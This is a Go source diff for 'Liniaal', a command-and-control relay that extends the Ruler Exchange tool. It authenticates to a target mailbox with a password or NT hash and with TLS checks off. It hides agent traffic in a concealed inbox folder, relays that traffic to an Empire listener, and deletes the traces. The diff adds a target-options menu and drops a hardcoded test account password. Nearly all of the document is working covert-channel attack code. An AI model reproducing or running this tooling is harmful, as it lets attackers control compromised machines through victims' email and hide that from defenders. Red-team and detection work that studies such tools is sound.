@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
 	"net/http/cookiejar"
@@ -15,6 +16,7 @@ import (
 	"github.com/sensepost/ruler/autodiscover"
 	"github.com/sensepost/ruler/mapi"
 	"github.com/sensepost/ruler/utils"
+	"golang.org/x/crypto/ssh/terminal"
 )
 
 //globals
@@ -22,13 +24,20 @@ var config utils.Session
 var seen [][]byte
 var lastSeen time.Time
 var mailpire MailPireConfig
+var agent Agent
+var nocache = false
 
 //Agent holds information about the current agent
 type Agent struct {
 	Host         string //the host with Empire listener
+	Domain       string //domain name if required
+	Username     string //Username
+	Password     string //
+	URL          string
 	UserAgent    string //the UA to use for Empire
 	EmailAddress string //email address of our agent
 	FolderID     []byte //folder ID we are using
+	FolderName   string //name for our hidden folder
 	MapiSession  utils.Session
 }
 
@@ -58,90 +67,17 @@ func fromUnicode(uni []byte) string {
 }
 
 func exit(err error) {
-	//we had an error and we don't have a MAPI session
+	//we had an error
 	if err != nil {
-		fmt.Println(err)
-		os.Exit(-1)
+		utils.Error.Println(err)
 	}
+
 	//let's disconnect from the MAPI session
 	exitcode, err := mapi.Disconnect()
 	if err != nil {
-		fmt.Println(err)
+		utils.Error.Println(err)
 	}
 	os.Exit(exitcode)
-}
-
-func getMapiHTTP(email string, autoURLPtr string) *utils.AutodiscoverResp {
-	var resp *utils.AutodiscoverResp
-	var err error
-
-	if autoURLPtr == "" {
-		//rather use the email address's domain here and --domain is the authentication domain
-		lastBin := strings.LastIndex(email, "@")
-		if lastBin == -1 {
-			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
-		}
-		maildomain := email[lastBin+1:]
-		resp, _, err = autodiscover.MAPIDiscover(maildomain)
-	} else {
-		resp, _, err = autodiscover.MAPIDiscover(autoURLPtr)
-	}
-
-	if resp == nil || err != nil {
-		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
-	}
-	//check if the autodiscover service responded with an error
-	if resp.Response.Error != (utils.AutoError{}) {
-		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
-	}
-	return resp
-}
-
-func getRPCHTTP(autoURLPtr string) *utils.AutodiscoverResp {
-	var resp *utils.AutodiscoverResp
-	var err error
-
-	if autoURLPtr == "" {
-		//rather use the email address's domain here and --domain is the authentication domain
-		lastBin := strings.LastIndex(config.Email, "@")
-		if lastBin == -1 {
-			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
-		}
-		maildomain := config.Email[lastBin+1:]
-		resp, _, err = autodiscover.Autodiscover(maildomain)
-	} else {
-		resp, _, err = autodiscover.Autodiscover(autoURLPtr)
-	}
-
-	if resp == nil || err != nil {
-		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
-	}
-	//check if the autodiscover service responded with an error
-	if resp.Response.Error != (utils.AutoError{}) {
-		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
-	}
-
-	url := ""
-	user := ""
-	for _, v := range resp.Response.Account.Protocol {
-		if v.Type == "EXPR" {
-			if v.SSL == "Off" {
-				url = "http://" + v.Server
-			} else {
-				url = "https://" + v.Server
-			}
-			if v.AuthPackage == "Ntlm" { //set the encryption on if the server specifies NTLM auth
-				config.RPCEncrypt = true
-			}
-		}
-		if v.Type == "EXCH" {
-			user = v.Server
-		}
-	}
-	config.RPCURL = fmt.Sprintf("%s/rpc/rpcproxy.dll?%s:6001", url, user)
-	config.RPCMailbox = user
-
-	return resp
 }
 
 func sendMessage(agent *Agent, rpc string) {
@@ -205,7 +141,6 @@ func getMessage(agent *Agent) string {
 
 					buff, err := mapi.GetMessageFast(folderid, messageid, columns)
 					if err != nil {
-						fmt.Println(err)
 						continue
 					}
 					//convert buffer to rows
@@ -220,7 +155,8 @@ func getMessage(agent *Agent) string {
 
 					client := &http.Client{}
 					var req *http.Request
-					lastSeen = time.Now()
+
+					utils.Info.Printf("Got message from Agent at: %s", time.Now().Format("02/01/2006 03:04:05 PM"))
 
 					if strings.ToUpper(string(payload[0:5])) == "POST " {
 						pp := toBytes(payload[7:])
@@ -261,16 +197,14 @@ func getMessage(agent *Agent) string {
 					if err != nil {
 						continue
 					}
-					body, err := ioutil.ReadAll(resp.Body)
-					if err != nil {
+					var body []byte
+					if body, err = ioutil.ReadAll(resp.Body); err != nil {
 						continue
 					}
 					rpc = encodeToB64(body)
 
 					//we also need to mark the message for deletion
-					_, err = mapi.DeleteMessages(folderid, 1, messageid)
-					if err != nil {
-						fmt.Println(err)
+					if _, err = mapi.DeleteMessages(folderid, 1, messageid); err != nil {
 						continue
 					}
 					return rpc
@@ -286,17 +220,20 @@ func getMessage(agent *Agent) string {
 	return rpc
 }
 
-func setupSession(email, username, password string) Agent {
+func setupSession() {
 	var config utils.Session
 	//setup our autodiscover service
-	config.Domain = ""
-	config.User = username
-	config.Pass = password
-	config.Email = email
-	config.NTHash, _ = hex.DecodeString("aa")
+	config.Domain = agent.Domain
+	config.User = agent.Username
+	config.Pass = agent.Password
+	config.Email = agent.EmailAddress
+	if dec, err := hex.DecodeString(agent.Password); err == nil {
+		config.NTHash = dec
+		config.Pass = ""
+	}
 	config.Basic = false
 	config.Insecure = true
-	config.Verbose = false
+	config.Verbose = true
 	config.Admin = false
 	config.RPCEncrypt = false
 	config.CookieJar, _ = cookiejar.New(nil)
@@ -304,29 +241,47 @@ func setupSession(email, username, password string) Agent {
 	autodiscover.SessionConfig = &config
 
 	var resp *utils.AutodiscoverResp
+	var rawAutodiscover string
+	var err error
 	//var err error
 
-	var mapiURL, abkURL, userDN string
-
-	resp = getMapiHTTP(email, "")
-	mapiURL = mapi.ExtractMapiURL(resp)
-	abkURL = mapi.ExtractMapiAddressBookURL(resp)
-	userDN = resp.Response.User.LegacyDN
-	if mapiURL == "" {
-		exit(fmt.Errorf("[x] No MAPI URL found. Exiting"))
+	if nocache == false {
+		resp = autodiscover.CheckCache(config.Email)
 	}
 
-	mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
+	if resp, rawAutodiscover, err = autodiscover.GetMapiHTTP(agent.EmailAddress, agent.URL, resp); err != nil {
+		exit(err)
+	}
 
-	agent := Agent{}
+	mapiURL := mapi.ExtractMapiURL(resp)
+	userDN := resp.Response.User.LegacyDN
+
+	if mapiURL == "" {
+		if resp, _, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(agent.EmailAddress, agent.URL, resp); err != nil {
+			exit(err)
+		}
+
+		if resp.Response.User.LegacyDN == "" {
+			exit(fmt.Errorf("Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error))
+		}
+
+		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
+		if nocache == false {
+			autodiscover.CreateCache(agent.EmailAddress, rawAutodiscover) //store the autodiscover for future use
+		}
+	} else {
+		mapi.Init(&config, userDN, mapiURL, "", mapi.HTTP)
+		if nocache == false {
+			autodiscover.CreateCache(agent.EmailAddress, rawAutodiscover) //store the autodiscover for future use
+		}
+	}
 	agent.MapiSession = *mapi.AuthSession
-	agent.EmailAddress = email
-	return agent
 }
 
-func runAgent(agent Agent) {
+func runAgent() {
 
 	logon, err := mapi.Authenticate()
+	utils.Info.Println("Authenticated - Setting Up Agent")
 
 	if err != nil {
 		exit(err)
@@ -337,54 +292,181 @@ func runAgent(agent Agent) {
 
 		rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
 
-		if er != nil {
-
-			mapi.GetFolder(mapi.INBOX, propertyTags)
-			r, err := mapi.CreateFolder(mailpire.FolderName, true)
-			if err != nil {
-				return
-			}
-			agent.FolderID = r.FolderID
-		} else {
+		if er == nil {
 			for k := 0; k < len(rows.RowData); k++ {
 				//convert string from unicode and then check if it is our target folder
-				if fromUnicode(rows.RowData[k][0].ValueArray) == mailpire.FolderName {
+				if fromUnicode(rows.RowData[k][0].ValueArray) == agent.FolderName {
 					agent.FolderID = rows.RowData[k][1].ValueArray
-				}
-			}
-			if len(agent.FolderID) == 0 {
-				//fmt.Println("[*] Can't find our folder, so create our hidden folder")
-				mapi.GetFolder(mapi.INBOX, propertyTags)
-				_, err := mapi.CreateFolder(mailpire.FolderName, true)
-				if err != nil {
-					return
-				}
-				rows, _ = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
-
-				for k := 0; k < len(rows.RowData); k++ {
-					//convert string from unicode and then check if it is our target folder
-					if fromUnicode(rows.RowData[k][0].ValueArray) == mailpire.FolderName {
-						agent.FolderID = rows.RowData[k][1].ValueArray
-					}
+					break
 				}
 			}
 		}
-		//fmt.Printf("Folderid: %x\n", agent.FolderID)
+
+		if len(agent.FolderID) == 0 {
+			utils.Info.Println("Can't find our folder, so create our hidden folder")
+			mapi.GetFolder(mapi.INBOX, propertyTags)
+			_, err := mapi.CreateFolder(agent.FolderName, true)
+			if err != nil {
+				return
+			}
+
+			time.Sleep(time.Second * (time.Duration)(2))
+
+			rows, _ = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
+
+			for k := 0; k < len(rows.RowData); k++ {
+				//convert string from unicode and then check if it is our target folder
+				if fromUnicode(rows.RowData[k][0].ValueArray) == agent.FolderName {
+					agent.FolderID = rows.RowData[k][1].ValueArray
+					break
+				}
+			}
+		}
+		utils.Info.Print("Agent Listening")
+		output("")
 		for {
 			rpc := getMessage(&agent)
 			if rpc != "" {
-				fmt.Println("Sending message of length: ", len(rpc))
+				utils.Info.Printf("Sending response of length %d to agent", len(rpc))
 				sendMessage(&agent, rpc)
-				fmt.Println("Sent message")
+				utils.Info.Printf("Sent response to agent at: %s", time.Now().Format("02/01/2006 03:04:05 PM"))
 			}
 		}
 	}
 }
+
+//Option struct for controlling agent options through a menu
+type Option struct {
+	Value       string
+	Description string
+}
+
+var options = make(map[string]Option)
+var term *terminal.Terminal
+
+func autocomp(line string, pos int, key rune) (newLine string, newPos int, ok bool) {
+	cmds := []string{"options", "info", "set", "run", "exit"}
+
+	if byte(key) != 9 {
+		return line, pos, false
+	}
+
+	for _, val := range cmds {
+		if len(val) > len(line) && val[:len(line)] == line {
+			return val, len(val), true
+		}
+		if len(line) > len(val) && val == line[:len(val)] {
+			if val == "set" {
+				for k := range options {
+					l := line[len(val)+1:]
+					if len(k) >= len(l) && k[:len(l)] == l {
+						return fmt.Sprintf("set %s ", k), len(val) + len(k) + 2, true
+					}
+				}
+			}
+		}
+	}
+
+	return line, pos, false
+}
+
+var dataIn, dataOut = io.Pipe()
+var strLen = 0
+
+//output writer for the terminal. ensure proper line endings
+func output(data string) {
+	term.Write([]byte(fmt.Sprintf("%s\r\n", data)))
+}
+
+func outputStatus() {
+	for {
+		data := make([]byte, 2048)
+		n, err := dataIn.Read(data)
+		if n > 0 {
+			ds := strings.Replace(string(data[:n]), "\n", "", -1)
+			fmt.Printf(fmt.Sprintf("\r\r%%-%ds", strLen), ds)
+			strLen = len(ds)
+		}
+		if err != nil && err != io.EOF {
+			fmt.Println(err)
+			break
+		}
+	}
+
+}
+
+//work-around for map and struct not playing nicely: https://github.com/golang/go/issues/3117
+func setOption(name, value string) {
+	tmp := options[name]
+	tmp.Value = value
+	options[name] = tmp
+}
+
+//lazy man's get. returns the value of the struct at map["index"]
+func getOption(name string) string {
+	return options[name].Value
+}
+
 func main() {
-	mailpire = MailPireConfig{FolderName: "Liniaal"}
-	agent := setupSession("jamesthetester@outlook.com", "", "heyJames1987")
-	agent.Host = "http://172.17.0.2:8080"
-	go runAgent(agent)
+	options = map[string]Option{
+		"EmailAddress": {"demo@outlook.com", "The target mailbox/email address"},
+		"Username":     {"", "The username of our target user, if required"},
+		"Domain":       {"", "The domain of our target user, if required"},
+		"Password":     {"", "The password for the target user"},
+		"Folder":       {"Liniaal", "The name of the hidden folder"},
+		"Host":         {"http://localhost:8080", "The address of our Empire listener"},
+		"URL":          {"", "A custom autodiscover end-point"}}
+
+	oldState, err := terminal.MakeRaw(0)
+	if err != nil {
+		panic(err)
+	}
+	term = terminal.NewTerminal(os.Stdin, "> ")
+	term.AutoCompleteCallback = autocomp
+
+	output("Liniaal - a communication extension to Ruler")
+	output("use 'options' to view settings for your agent. 'set key value' to change settings.\r\nFor anything else, use 'help'")
+
+	for {
+		line, _ := term.ReadLine()
+		parts := strings.Split(line, " ")
+
+		if line == "exit" {
+			terminal.Restore(0, oldState)
+			os.Exit(0)
+		}
+		if line == "options" || line == "info" {
+			output("== Agent options ==")
+			for k, v := range options {
+				output(fmt.Sprintf("%-20s %-30s %s", k, v.Value, v.Description))
+			}
+		}
+		if len(parts) == 3 && parts[0] == "set" {
+			setOption(parts[1], parts[2])
+		}
+		if line == "run" {
+			break
+		}
+	}
+	output("")
+	terminal.Restore(0, oldState)
+
+	utils.Init(ioutil.Discard, dataOut, dataOut, os.Stderr)
+	go outputStatus()
+
+	terminal.Restore(0, oldState)
+
+	agent.Host = getOption("Host")
+	agent.EmailAddress = getOption("EmailAddress")
+	agent.Password = getOption("Password")
+	agent.Username = getOption("Username")
+	agent.FolderName = getOption("Folder")
+	agent.Domain = getOption("Domain")
+
+	setupSession()
+
+	go runAgent()
 	x := make(chan bool, 1)
 	<-x
+
 }
